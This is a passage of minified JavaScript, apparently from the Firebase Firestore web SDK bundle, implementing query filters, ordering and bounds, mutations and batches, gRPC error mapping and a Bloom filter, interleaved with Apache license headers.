 */class qd{constructor(e,t){this.position=e,this.inclusive=t}}function QI(n,e,t){let r=0;for(let i=0;i<n.position.length;i++){const s=e[i],o=n.position[i];if(s.field.isKeyField()?r=Te.comparator(Te.fromName(o.referenceValue),t.key):r=Ql(o,t.data.field(s.field)),s.dir==="desc"&&(r*=-1),r!==0)break}return r}function YI(n,e){if(n===null)return e===null;if(e===null||n.inclusive!==e.inclusive||n.position.length!==e.position.length)return!1;for(let t=0;t<n.position.length;t++)if(!Pi(n.position[t],e.position[t]))return!1;return!0}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Kd{constructor(e,t="asc"){this.field=e,this.dir=t}}function HV(n,e){return n.dir===e.dir&&n.field.isEqual(e.field)}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ik{}class dn extends Ik{constructor(e,t,r){super(),this.field=e,this.op=t,this.value=r}static create(e,t,r){return e.isKeyField()?t==="in"||t==="not-in"?this.createKeyFieldInFilter(e,t,r):new KV(e,t,r):t==="array-contains"?new YV(e,r):t==="in"?new ZV(e,r):t==="not-in"?new JV(e,r):t==="array-contains-any"?new XV(e,r):new dn(e,t,r)}static createKeyFieldInFilter(e,t,r){return t==="in"?new GV(e,r):new QV(e,r)}matches(e){const t=e.data.field(this.field);return this.op==="!="?t!==null&&this.matchesComparison(Ql(t,this.value)):t!==null&&wo(this.value)===wo(t)&&this.matchesComparison(Ql(t,this.value))}matchesComparison(e){switch(this.op){case"<":return e<0;case"<=":return e<=0;case"==":return e===0;case"!=":return e!==0;case">":return e>0;case">=":return e>=0;default:return Ne()}}isInequality(){return["<","<=",">",">=","!=","not-in"].indexOf(this.op)>=0}getFlattenedFilters(){return[this]}getFilters(){return[this]}}class yi extends Ik{constructor(e,t){super(),this.filters=e,this.op=t,this.ce=null}static create(e,t){return new yi(e,t)}matches(e){return Sk(this)?this.filters.find(t=>!t.matches(e))===void 0:this.filters.find(t=>t.matches(e))!==void 0}getFlattenedFilters(){return this.ce!==null||(this.ce=this.filters.reduce((e,t)=>e.concat(t.getFlattenedFilters()),[])),this.ce}getFilters(){return Object.assign([],this.filters)}}function Sk(n){return n.op==="and"}function Tk(n){return qV(n)&&Sk(n)}function qV(n){for(const e of n.filters)if(e instanceof yi)return!1;return!0}function xy(n){if(n instanceof dn)return n.field.canonicalString()+n.op.toString()+Yl(n.value);if(Tk(n))return n.filters.map(e=>xy(e)).join(",");{const e=n.filters.map(t=>xy(t)).join(",");return`${n.op}(${e})`}}function Ak(n,e){return n instanceof dn?function(r,i){return i instanceof dn&&r.op===i.op&&r.field.isEqual(i.field)&&Pi(r.value,i.value)}(n,e):n instanceof yi?function(r,i){return i instanceof yi&&r.op===i.op&&r.filters.length===i.filters.length?r.filters.reduce((s,o,a)=>s&&Ak(o,i.filters[a]),!0):!1}(n,e):void Ne()}function bk(n){return n instanceof dn?function(t){return`${t.field.canonicalString()} ${t.op} ${Yl(t.value)}`}(n):n instanceof yi?function(t){return t.op.toString()+" {"+t.getFilters().map(bk).join(" ,")+"}"}(n):"Filter"}class KV extends dn{constructor(e,t,r){super(e,t,r),this.key=Te.fromName(r.referenceValue)}matches(e){const t=Te.comparator(e.key,this.key);return this.matchesComparison(t)}}class GV extends dn{constructor(e,t){super(e,"in",t),this.keys=xk("in",t)}matches(e){return this.keys.some(t=>t.isEqual(e.key))}}class QV extends dn{constructor(e,t){super(e,"not-in",t),this.keys=xk("not-in",t)}matches(e){return!this.keys.some(t=>t.isEqual(e.key))}}function xk(n,e){var t;return(((t=e.arrayValue)===null||t===void 0?void 0:t.values)||[]).map(r=>Te.fromName(r.referenceValue))}class YV extends dn{constructor(e,t){super(e,"array-contains",t)}matches(e){const t=e.data.field(this.field);return Bv(t)&&Xu(t.arrayValue,this.value)}}class ZV extends dn{constructor(e,t){super(e,"in",t)}matches(e){const t=e.data.field(this.field);return t!==null&&Xu(this.value.arrayValue,t)}}class JV extends dn{constructor(e,t){super(e,"not-in",t)}matches(e){if(Xu(this.value.arrayValue,{nullValue:"NULL_VALUE"}))return!1;const t=e.data.field(this.field);return t!==null&&!Xu(this.value.arrayValue,t)}}class XV extends dn{constructor(e,t){super(e,"array-contains-any",t)}matches(e){const t=e.data.field(this.field);return!(!Bv(t)||!t.arrayValue.values)&&t.arrayValue.values.some(r=>Xu(this.value.arrayValue,r))}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class eF{constructor(e,t=null,r=[],i=[],s=null,o=null,a=null){this.path=e,this.collectionGroup=t,this.orderBy=r,this.filters=i,this.limit=s,this.startAt=o,this.endAt=a,this.le=null}}function ZI(n,e=null,t=[],r=[],i=null,s=null,o=null){return new eF(n,e,t,r,i,s,o)}function Uv(n){const e=Be(n);if(e.le===null){let t=e.path.canonicalString();e.collectionGroup!==null&&(t+="|cg:"+e.collectionGroup),t+="|f:",t+=e.filters.map(r=>xy(r)).join(","),t+="|ob:",t+=e.orderBy.map(r=>function(s){return s.field.canonicalString()+s.dir}(r)).join(","),Zp(e.limit)||(t+="|l:",t+=e.limit),e.startAt&&(t+="|lb:",t+=e.startAt.inclusive?"b:":"a:",t+=e.startAt.position.map(r=>Yl(r)).join(",")),e.endAt&&(t+="|ub:",t+=e.endAt.inclusive?"a:":"b:",t+=e.endAt.position.map(r=>Yl(r)).join(",")),e.le=t}return e.le}function jv(n,e){if(n.limit!==e.limit||n.orderBy.length!==e.orderBy.length)return!1;for(let t=0;t<n.orderBy.length;t++)if(!HV(n.orderBy[t],e.orderBy[t]))return!1;if(n.filters.length!==e.filters.length)return!1;for(let t=0;t<n.filters.length;t++)if(!Ak(n.filters[t],e.filters[t]))return!1;return n.collectionGroup===e.collectionGroup&&!!n.path.isEqual(e.path)&&!!YI(n.startAt,e.startAt)&&YI(n.endAt,e.endAt)}function ky(n){return Te.isDocumentKey(n.path)&&n.collectionGroup===null&&n.filters.length===0}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Eh{constructor(e,t=null,r=[],i=[],s=null,o="F",a=null,l=null){this.path=e,this.collectionGroup=t,this.explicitOrderBy=r,this.filters=i,this.limit=s,this.limitType=o,this.startAt=a,this.endAt=l,this.he=null,this.Pe=null,this.Te=null,this.startAt,this.endAt}}function tF(n,e,t,r,i,s,o,a){return new Eh(n,e,t,r,i,s,o,a)}function Vv(n){return new Eh(n)}function JI(n){return n.filters.length===0&&n.limit===null&&n.startAt==null&&n.endAt==null&&(n.explicitOrderBy.length===0||n.explicitOrderBy.length===1&&n.explicitOrderBy[0].field.isKeyField())}function kk(n){return n.collectionGroup!==null}function mu(n){const e=Be(n);if(e.he===null){e.he=[];const t=new Set;for(const s of e.explicitOrderBy)e.he.push(s),t.add(s.field.canonicalString());const r=e.explicitOrderBy.length>0?e.explicitOrderBy[e.explicitOrderBy.length-1].dir:"asc";(function(o){let a=new wn(Un.comparator);return o.filters.forEach(l=>{l.getFlattenedFilters().forEach(u=>{u.isInequality()&&(a=a.add(u.field))})}),a})(e).forEach(s=>{t.has(s.canonicalString())||s.isKeyField()||e.he.push(new Kd(s,r))}),t.has(Un.keyField().canonicalString())||e.he.push(new Kd(Un.keyField(),r))}return e.he}function Ri(n){const e=Be(n);return e.Pe||(e.Pe=nF(e,mu(n))),e.Pe}function nF(n,e){if(n.limitType==="F")return ZI(n.path,n.collectionGroup,e,n.filters,n.limit,n.startAt,n.endAt);{e=e.map(i=>{const s=i.dir==="desc"?"asc":"desc";return new Kd(i.field,s)});const t=n.endAt?new qd(n.endAt.position,n.endAt.inclusive):null,r=n.startAt?new qd(n.startAt.position,n.startAt.inclusive):null;return ZI(n.path,n.collectionGroup,e,n.filters,n.limit,t,r)}}function Cy(n,e){const t=n.filters.concat([e]);return new Eh(n.path,n.collectionGroup,n.explicitOrderBy.slice(),t,n.limit,n.limitType,n.startAt,n.endAt)}function Ry(n,e,t){return new Eh(n.path,n.collectionGroup,n.explicitOrderBy.slice(),n.filters.slice(),e,t,n.startAt,n.endAt)}function Xp(n,e){return jv(Ri(n),Ri(e))&&n.limitType===e.limitType}function Ck(n){return`${Uv(Ri(n))}|lt:${n.limitType}`}function Ga(n){return`Query(target=${function(t){let r=t.path.canonicalString();return t.collectionGroup!==null&&(r+=" collectionGroup="+t.collectionGroup),t.filters.length>0&&(r+=`, filters: [${t.filters.map(i=>bk(i)).join(", ")}]`),Zp(t.limit)||(r+=", limit: "+t.limit),t.orderBy.length>0&&(r+=`, orderBy: [${t.orderBy.map(i=>function(o){return`${o.field.canonicalString()} (${o.dir})`}(i)).join(", ")}]`),t.startAt&&(r+=", startAt: ",r+=t.startAt.inclusive?"b:":"a:",r+=t.startAt.position.map(i=>Yl(i)).join(",")),t.endAt&&(r+=", endAt: ",r+=t.endAt.inclusive?"a:":"b:",r+=t.endAt.position.map(i=>Yl(i)).join(",")),`Target(${r})`}(Ri(n))}; limitType=${n.limitType})`}function eg(n,e){return e.isFoundDocument()&&function(r,i){const s=i.key.path;return r.collectionGroup!==null?i.key.hasCollectionId(r.collectionGroup)&&r.path.isPrefixOf(s):Te.isDocumentKey(r.path)?r.path.isEqual(s):r.path.isImmediateParentOf(s)}(n,e)&&function(r,i){for(const s of mu(r))if(!s.field.isKeyField()&&i.data.field(s.field)===null)return!1;return!0}(n,e)&&function(r,i){for(const s of r.filters)if(!s.matches(i))return!1;return!0}(n,e)&&function(r,i){return!(r.startAt&&!function(o,a,l){const u=QI(o,a,l);return o.inclusive?u<=0:u<0}(r.startAt,mu(r),i)||r.endAt&&!function(o,a,l){const u=QI(o,a,l);return o.inclusive?u>=0:u>0}(r.endAt,mu(r),i))}(n,e)}function rF(n){return n.collectionGroup||(n.path.length%2==1?n.path.lastSegment():n.path.get(n.path.length-2))}function Rk(n){return(e,t)=>{let r=!1;for(const i of mu(n)){const s=iF(i,e,t);if(s!==0)return s;r=r||i.field.isKeyField()}return 0}}function iF(n,e,t){const r=n.field.isKeyField()?Te.comparator(e.key,t.key):function(s,o,a){const l=o.data.field(s),u=a.data.field(s);return l!==null&&u!==null?Ql(l,u):Ne()}(n.field,e,t);switch(n.dir){case"asc":return r;case"desc":return-1*r;default:return Ne()}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class xa{constructor(e,t){this.mapKeyFn=e,this.equalsFn=t,this.inner={},this.innerSize=0}get(e){const t=this.mapKeyFn(e),r=this.inner[t];if(r!==void 0){for(const[i,s]of r)if(this.equalsFn(i,e))return s}}has(e){return this.get(e)!==void 0}set(e,t){const r=this.mapKeyFn(e),i=this.inner[r];if(i===void 0)return this.inner[r]=[[e,t]],void this.innerSize++;for(let s=0;s<i.length;s++)if(this.equalsFn(i[s][0],e))return void(i[s]=[e,t]);i.push([e,t]),this.innerSize++}delete(e){const t=this.mapKeyFn(e),r=this.inner[t];if(r===void 0)return!1;for(let i=0;i<r.length;i++)if(this.equalsFn(r[i][0],e))return r.length===1?delete this.inner[t]:r.splice(i,1),this.innerSize--,!0;return!1}forEach(e){xo(this.inner,(t,r)=>{for(const[i,s]of r)e(i,s)})}isEmpty(){return fk(this.inner)}size(){return this.innerSize}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const sF=new Qt(Te.comparator);function ws(){return sF}const Mk=new Qt(Te.comparator);function Jc(...n){let e=Mk;for(const t of n)e=e.insert(t.key,t);return e}function Nk(n){let e=Mk;return n.forEach((t,r)=>e=e.insert(t,r.overlayedDocument)),e}function Xo(){return yu()}function Pk(){return yu()}function yu(){return new xa(n=>n.toString(),(n,e)=>n.isEqual(e))}const oF=new Qt(Te.comparator),aF=new wn(Te.comparator);function Ye(...n){let e=aF;for(const t of n)e=e.add(t);return e}const lF=new wn($e);function cF(){return lF}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Fv(n,e){if(n.useProto3Json){if(isNaN(e))return{doubleValue:"NaN"};if(e===1/0)return{doubleValue:"Infinity"};if(e===-1/0)return{doubleValue:"-Infinity"}}return{doubleValue:Wd(e)?"-0":e}}function Lk(n){return{integerValue:""+n}}function uF(n,e){return UV(e)?Lk(e):Fv(n,e)}/**
 * @license
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class tg{constructor(){this._=void 0}}function hF(n,e,t){return n instanceof Gd?function(i,s){const o={fields:{[gk]:{stringValue:pk},[yk]:{timestampValue:{seconds:i.seconds,nanos:i.nanoseconds}}}};return s&&Ov(s)&&(s=Jp(s)),s&&(o.fields[mk]=s),{mapValue:o}}(t,e):n instanceof eh?Ok(n,e):n instanceof th?Bk(n,e):function(i,s){const o=Dk(i,s),a=XI(o)+XI(i.Ie);return by(o)&&by(i.Ie)?Lk(a):Fv(i.serializer,a)}(n,e)}function fF(n,e,t){return n instanceof eh?Ok(n,e):n instanceof th?Bk(n,e):t}function Dk(n,e){return n instanceof Qd?function(r){return by(r)||function(s){return!!s&&"doubleValue"in s}(r)}(e)?e:{integerValue:0}:null}class Gd extends tg{}class eh extends tg{constructor(e){super(),this.elements=e}}function Ok(n,e){const t=Uk(e);for(const r of n.elements)t.some(i=>Pi(i,r))||t.push(r);return{arrayValue:{values:t}}}class th extends tg{constructor(e){super(),this.elements=e}}function Bk(n,e){let t=Uk(e);for(const r of n.elements)t=t.filter(i=>!Pi(i,r));return{arrayValue:{values:t}}}class Qd extends tg{constructor(e,t){super(),this.serializer=e,this.Ie=t}}function XI(n){return nn(n.integerValue||n.doubleValue)}function Uk(n){return Bv(n)&&n.arrayValue.values?n.arrayValue.values.slice():[]}function dF(n,e){return n.field.isEqual(e.field)&&function(r,i){return r instanceof eh&&i instanceof eh||r instanceof th&&i instanceof th?Gl(r.elements,i.elements,Pi):r instanceof Qd&&i instanceof Qd?Pi(r.Ie,i.Ie):r instanceof Gd&&i instanceof Gd}(n.transform,e.transform)}class pF{constructor(e,t){this.version=e,this.transformResults=t}}class fi{constructor(e,t){this.updateTime=e,this.exists=t}static none(){return new fi}static exists(e){return new fi(void 0,e)}static updateTime(e){return new fi(e)}get isNone(){return this.updateTime===void 0&&this.exists===void 0}isEqual(e){return this.exists===e.exists&&(this.updateTime?!!e.updateTime&&this.updateTime.isEqual(e.updateTime):!e.updateTime)}}function qf(n,e){return n.updateTime!==void 0?e.isFoundDocument()&&e.version.isEqual(n.updateTime):n.exists===void 0||n.exists===e.isFoundDocument()}class ng{}function jk(n,e){if(!n.hasLocalMutations||e&&e.fields.length===0)return null;if(e===null)return n.isNoDocument()?new Fk(n.key,fi.none()):new Ih(n.key,n.data,fi.none());{const t=n.data,r=yr.empty();let i=new wn(Un.comparator);for(let s of e.fields)if(!i.has(s)){let o=t.field(s);o===null&&s.length>1&&(s=s.popLast(),o=t.field(s)),o===null?r.delete(s):r.set(s,o),i=i.add(s)}return new ko(n.key,r,new Rr(i.toArray()),fi.none())}}function gF(n,e,t){n instanceof Ih?function(i,s,o){const a=i.value.clone(),l=tS(i.fieldTransforms,s,o.transformResults);a.setAll(l),s.convertToFoundDocument(o.version,a).setHasCommittedMutations()}(n,e,t):n instanceof ko?function(i,s,o){if(!qf(i.precondition,s))return void s.convertToUnknownDocument(o.version);const a=tS(i.fieldTransforms,s,o.transformResults),l=s.data;l.setAll(Vk(i)),l.setAll(a),s.convertToFoundDocument(o.version,l).setHasCommittedMutations()}(n,e,t):function(i,s,o){s.convertToNoDocument(o.version).setHasCommittedMutations()}(0,e,t)}function wu(n,e,t,r){return n instanceof Ih?function(s,o,a,l){if(!qf(s.precondition,o))return a;const u=s.value.clone(),h=nS(s.fieldTransforms,l,o);return u.setAll(h),o.convertToFoundDocument(o.version,u).setHasLocalMutations(),null}(n,e,t,r):n instanceof ko?function(s,o,a,l){if(!qf(s.precondition,o))return a;const u=nS(s.fieldTransforms,l,o),h=o.data;return h.setAll(Vk(s)),h.setAll(u),o.convertToFoundDocument(o.version,h).setHasLocalMutations(),a===null?null:a.unionWith(s.fieldMask.fields).unionWith(s.fieldTransforms.map(f=>f.field))}(n,e,t,r):function(s,o,a){return qf(s.precondition,o)?(o.convertToNoDocument(o.version).setHasLocalMutations(),null):a}(n,e,t)}function mF(n,e){let t=null;for(const r of n.fieldTransforms){const i=e.data.field(r.field),s=Dk(r.transform,i||null);s!=null&&(t===null&&(t=yr.empty()),t.set(r.field,s))}return t||null}function eS(n,e){return n.type===e.type&&!!n.key.isEqual(e.key)&&!!n.precondition.isEqual(e.precondition)&&!!function(r,i){return r===void 0&&i===void 0||!(!r||!i)&&Gl(r,i,(s,o)=>dF(s,o))}(n.fieldTransforms,e.fieldTransforms)&&(n.type===0?n.value.isEqual(e.value):n.type!==1||n.data.isEqual(e.data)&&n.fieldMask.isEqual(e.fieldMask))}class Ih extends ng{constructor(e,t,r,i=[]){super(),this.key=e,this.value=t,this.precondition=r,this.fieldTransforms=i,this.type=0}getFieldMask(){return null}}class ko extends ng{constructor(e,t,r,i,s=[]){super(),this.key=e,this.data=t,this.fieldMask=r,this.precondition=i,this.fieldTransforms=s,this.type=1}getFieldMask(){return this.fieldMask}}function Vk(n){const e=new Map;return n.fieldMask.fields.forEach(t=>{if(!t.isEmpty()){const r=n.data.field(t);e.set(t,r)}}),e}function tS(n,e,t){const r=new Map;st(n.length===t.length);for(let i=0;i<t.length;i++){const s=n[i],o=s.transform,a=e.data.field(s.field);r.set(s.field,fF(o,a,t[i]))}return r}function nS(n,e,t){const r=new Map;for(const i of n){const s=i.transform,o=t.data.field(i.field);r.set(i.field,hF(s,o,e))}return r}class Fk extends ng{constructor(e,t){super(),this.key=e,this.precondition=t,this.type=2,this.fieldTransforms=[]}getFieldMask(){return null}}class yF extends ng{constructor(e,t){super(),this.key=e,this.precondition=t,this.type=3,this.fieldTransforms=[]}getFieldMask(){return null}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class wF{constructor(e,t,r,i){this.batchId=e,this.localWriteTime=t,this.baseMutations=r,this.mutations=i}applyToRemoteDocument(e,t){const r=t.mutationResults;for(let i=0;i<this.mutations.length;i++){const s=this.mutations[i];s.key.isEqual(e.key)&&gF(s,e,r[i])}}applyToLocalView(e,t){for(const r of this.baseMutations)r.key.isEqual(e.key)&&(t=wu(r,e,t,this.localWriteTime));for(const r of this.mutations)r.key.isEqual(e.key)&&(t=wu(r,e,t,this.localWriteTime));return t}applyToLocalDocumentSet(e,t){const r=Pk();return this.mutations.forEach(i=>{const s=e.get(i.key),o=s.overlayedDocument;let a=this.applyToLocalView(o,s.mutatedFields);a=t.has(i.key)?null:a;const l=jk(o,a);l!==null&&r.set(i.key,l),o.isValidDocument()||o.convertToNoDocument(De.min())}),r}keys(){return this.mutations.reduce((e,t)=>e.add(t.key),Ye())}isEqual(e){return this.batchId===e.batchId&&Gl(this.mutations,e.mutations,(t,r)=>eS(t,r))&&Gl(this.baseMutations,e.baseMutations,(t,r)=>eS(t,r))}}class zv{constructor(e,t,r,i){this.batch=e,this.commitVersion=t,this.mutationResults=r,this.docVersions=i}static from(e,t,r){st(e.mutations.length===r.length);let i=function(){return oF}();const s=e.mutations;for(let o=0;o<s.length;o++)i=i.insert(s[o].key,r[o].version);return new zv(e,t,r,i)}}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vF{constructor(e,t){this.largestBatchId=e,this.mutation=t}getKey(){return this.mutation.key}isEqual(e){return e!==null&&this.mutation===e.mutation}toString(){return`Overlay{
      largestBatchId: ${this.largestBatchId},
      mutation: ${this.mutation.toString()}
    }`}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class _F{constructor(e,t){this.count=e,this.unchangedNames=t}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */var ln,Ze;function EF(n){switch(n){case ie.OK:return Ne();case ie.CANCELLED:case ie.UNKNOWN:case ie.DEADLINE_EXCEEDED:case ie.RESOURCE_EXHAUSTED:case ie.INTERNAL:case ie.UNAVAILABLE:case ie.UNAUTHENTICATED:return!1;case ie.INVALID_ARGUMENT:case ie.NOT_FOUND:case ie.ALREADY_EXISTS:case ie.PERMISSION_DENIED:case ie.FAILED_PRECONDITION:case ie.ABORTED:case ie.OUT_OF_RANGE:case ie.UNIMPLEMENTED:case ie.DATA_LOSS:return!0;default:return Ne()}}function zk(n){if(n===void 0)return ys("GRPC error has no .code"),ie.UNKNOWN;switch(n){case ln.OK:return ie.OK;case ln.CANCELLED:return ie.CANCELLED;case ln.UNKNOWN:return ie.UNKNOWN;case ln.DEADLINE_EXCEEDED:return ie.DEADLINE_EXCEEDED;case ln.RESOURCE_EXHAUSTED:return ie.RESOURCE_EXHAUSTED;case ln.INTERNAL:return ie.INTERNAL;case ln.UNAVAILABLE:return ie.UNAVAILABLE;case ln.UNAUTHENTICATED:return ie.UNAUTHENTICATED;case ln.INVALID_ARGUMENT:return ie.INVALID_ARGUMENT;case ln.NOT_FOUND:return ie.NOT_FOUND;case ln.ALREADY_EXISTS:return ie.ALREADY_EXISTS;case ln.PERMISSION_DENIED:return ie.PERMISSION_DENIED;case ln.FAILED_PRECONDITION:return ie.FAILED_PRECONDITION;case ln.ABORTED:return ie.ABORTED;case ln.OUT_OF_RANGE:return ie.OUT_OF_RANGE;case ln.UNIMPLEMENTED:return ie.UNIMPLEMENTED;case ln.DATA_LOSS:return ie.DATA_LOSS;default:return Ne()}}(Ze=ln||(ln={}))[Ze.OK=0]="OK",Ze[Ze.CANCELLED=1]="CANCELLED",Ze[Ze.UNKNOWN=2]="UNKNOWN",Ze[Ze.INVALID_ARGUMENT=3]="INVALID_ARGUMENT",Ze[Ze.DEADLINE_EXCEEDED=4]="DEADLINE_EXCEEDED",Ze[Ze.NOT_FOUND=5]="NOT_FOUND",Ze[Ze.ALREADY_EXISTS=6]="ALREADY_EXISTS",Ze[Ze.PERMISSION_DENIED=7]="PERMISSION_DENIED",Ze[Ze.UNAUTHENTICATED=16]="UNAUTHENTICATED",Ze[Ze.RESOURCE_EXHAUSTED=8]="RESOURCE_EXHAUSTED",Ze[Ze.FAILED_PRECONDITION=9]="FAILED_PRECONDITION",Ze[Ze.ABORTED=10]="ABORTED",Ze[Ze.OUT_OF_RANGE=11]="OUT_OF_RANGE",Ze[Ze.UNIMPLEMENTED=12]="UNIMPLEMENTED",Ze[Ze.INTERNAL=13]="INTERNAL",Ze[Ze.UNAVAILABLE=14]="UNAVAILABLE",Ze[Ze.DATA_LOSS=15]="DATA_LOSS";/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const IF=new uo([4294967295,4294967295],0);function rS(n){const e=ck().encode(n),t=new nk;return t.update(e),new Uint8Array(t.digest())}function iS(n){const e=new DataView(n.buffer),t=e.getUint32(0,!0),r=e.getUint32(4,!0),i=e.getUint32(8,!0),s=e.getUint32(12,!0);return[new uo([t,r],0),new uo([i,s],0)]}class Wv{constructor(e,t,r){if(this.bitmap=e,this.padding=t,this.hashCount=r,t<0||t>=8)throw new Xc(`Invalid padding: ${t}`);if(r<0)throw new Xc(`Invalid hash count: ${r}`);if(e.length>0&&this.hashCount===0)throw new Xc(`Invalid hash count: ${r}`);if(e.length===0&&t!==0)throw new Xc(`Invalid padding when bitmap length is 0: ${t}`);this.Ee=8*e.length-t,this.de=uo.fromNumber(this.Ee)}Ae(e,t,r){let i=e.add(t.multiply(uo.fromNumber(r)));return i.compare(IF)===1&&(i=new uo([i.getBits(0),i.getBits(1)],0)),i.modulo(this.de).toNumber()}Re(e){return!!(this.bitmap[Math.floor(e/8)]&1<<e%8)}mightContain(e){if(this.Ee===0)return!1;const t=rS(e),[r,i]=iS(t);for(let s=0;s<this.hashCount;s++){const o=this.Ae(r,i,s);if(!this.Re(o))return!1}return!0}static create(e,t,r){const i=e%8==0?0:8-e%8,s=new Uint8Array(Math.ceil(e/8)),o=new Wv(s,i,t);return r.forEach(a=>o.insert(a)),o}insert(e){if(this.Ee===0)return;const t=rS(e),[r,i]=iS(t);for(let s=0;s<this.hashCount;s++){const o=this.Ae(r,i,s);this.Ve(o)}}Ve(e){const t=Math.floor(e/8),r=e%8;this.bitmap[t]|=1<<r}}class Xc extends Error{constructor(){super(...arguments),this.name="BloomFilterError"}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
